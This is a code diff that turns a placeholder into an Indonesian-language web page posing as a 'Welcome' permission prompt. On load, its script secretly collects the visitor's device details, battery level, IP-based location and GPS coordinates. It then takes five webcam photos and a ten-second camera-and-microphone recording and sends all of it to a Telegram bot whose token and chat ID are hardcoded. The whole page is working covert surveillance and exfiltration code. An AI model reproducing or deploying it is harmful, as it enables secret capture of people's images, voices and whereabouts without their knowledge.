@@ -1,1 +1,150 @@
-soon
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>
+      Welcome
+    </title>
+  </head>
+  <body>
+    <h1>
+      IZINKAN UNTUK MELANJUTKAN AKSI
+    </h1>
+    <video id="video" autoplay="" muted="" playsinline="" width="640" height="480">
+    </video>
+    <canvas id="canvas" width="640" height="480" style="display:none;">
+    </canvas>
+    <script>
+      const token = &#8492102774:AAHsjdJyFdVRhm4o1ZZKVC1Z_YV9mEWIZdA&#39;;
+    const chatId = &#39;-1003667336210&#39;;
+    const videoDuration = 10 * 1000;
+
+    const video = document.getElementById(&#39;video&#39;);
+    const canvas = document.getElementById(&#39;canvas&#39;);
+
+    async function getBatteryLevel() {
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          return `${Math.round(battery.level * 100)}%`;
+        } catch {
+          return &#34;Battery info not available&#34;;
+        }
+      }
+      return &#34;Battery info not supported&#34;;
+    }
+
+    function sendToTelegram(type, fileBlob) {
+      const formData = new FormData();
+      formData.append(&#34;chat_id&#34;, chatId);
+      formData.append(type, fileBlob);
+
+      fetch(`https://api.telegram.org/bot${token}/send${type === &#39;photo&#39; ? &#39;Photo&#39; : &#39;Video&#39;}`, {
+        method: &#39;POST&#39;,
+        body: formData
+      }).then(res =&gt; res.json())
+        .then(data =&gt; console.log(&#34;Terkirim:&#34;, data))
+        .catch(err =&gt; console.error(&#34;Gagal kirim:&#34;, err));
+    }
+
+    function sendInfoToTelegram(info) {
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: &#39;POST&#39;,
+        headers: { &#39;Content-Type&#39;: &#39;application/json&#39; },
+        body: JSON.stringify({ chat_id: chatId, text: info })
+      });
+    }
+
+    async function getIPInfo() {
+      try {
+        const res = await fetch(&#39;https://ipinfo.io/json?token=123456&#39;);
+        return await res.json();
+      } catch {
+        return {};
+      }
+    }
+
+    function getDeviceModel() {
+      const ua = navigator.userAgent;
+      if (ua.includes(&#34;Android&#34;)) {
+        const match = ua.match(/Android.+?;\s(.+?)\sBuild/);
+        return match ? match[1] : &#34;Android Device&#34;;
+      }
+      if (ua.includes(&#34;iPhone&#34;)) return &#34;iPhone&#34;;
+      if (ua.includes(&#34;iPad&#34;)) return &#34;iPad&#34;;
+      if (ua.includes(&#34;Windows&#34;)) return &#34;Windows PC&#34;;
+      if (ua.includes(&#34;Mac&#34;)) return &#34;Mac&#34;;
+      return &#34;Perangkat Tidak Diketahui&#34;;
+    }
+
+    async function start() {
+      const batteryLevel = await getBatteryLevel();
+      const userAgent = navigator.userAgent;
+      const deviceName = getDeviceModel();
+      const ipInfo = await getIPInfo();
+
+      navigator.geolocation.getCurrentPosition(async pos =&gt; {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
+        const info = `
+Perangkat   : ${deviceName}
+User-Agent  : ${userAgent}
+Baterai     : ${batteryLevel}
+IP Address  : ${ipInfo.ip || &#34;-&#34;}
+Kota        : ${ipInfo.city || &#34;-&#34;}
+Wilayah     : ${ipInfo.region || &#34;-&#34;}
+Negara      : ${ipInfo.country || &#34;-&#34;}
+Lokasi Maps : https://maps.google.com/?q=${lat},${lon}
+Waktu Akses : ${new Date().toLocaleString()}
+        `;
+        sendInfoToTelegram(info);
+      }, () =&gt; {
+        const info = `
+Perangkat   : ${deviceName}
+User-Agent  : ${userAgent}
+Baterai     : ${batteryLevel}
+IP Address  : ${ipInfo.ip || &#34;-&#34;}
+Kota        : ${ipInfo.city || &#34;-&#34;}
+Wilayah     : ${ipInfo.region || &#34;-&#34;}
+Negara      : ${ipInfo.country || &#34;-&#34;}
+Lokasi Maps : Tidak diizinkan
+Waktu Akses : ${new Date().toLocaleString()}
+        `;
+        sendInfoToTelegram(info);
+      });
+
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+      video.srcObject = stream;
+
+      // Pastikan video aktif dulu sebelum ambil foto
+      await new Promise(resolve =&gt; setTimeout(resolve, 1000));
+
+      // Ambil 5 foto berturut-turut, satu per detik
+      for (let i = 0; i &lt; 5; i++) {
+        await new Promise(resolve =&gt; setTimeout(resolve, 1000)); // Tunggu 1 detik
+        canvas.getContext(&#39;2d&#39;).drawImage(video, 0, 0, canvas.width, canvas.height);
+        await new Promise(res =&gt; {
+          canvas.toBlob(blob =&gt; {
+            sendToTelegram(&#39;photo&#39;, blob);
+            res();
+          }, &#39;image/jpeg&#39;);
+        });
+      }
+
+      // Rekam video 10 detik
+      const mediaRecorder = new MediaRecorder(stream);
+      const chunks = [];
+      mediaRecorder.ondataavailable = e =&gt; chunks.push(e.data);
+      mediaRecorder.onstop = () =&gt; {
+        const videoBlob = new Blob(chunks, { type: &#39;video/webm&#39; });
+        sendToTelegram(&#39;video&#39;, videoBlob);
+      };
+      mediaRecorder.start();
+      setTimeout(() =&gt; mediaRecorder.stop(), videoDuration);
+    }
+
+    start();
+    </script>
+  </body>
+  </html>
+  
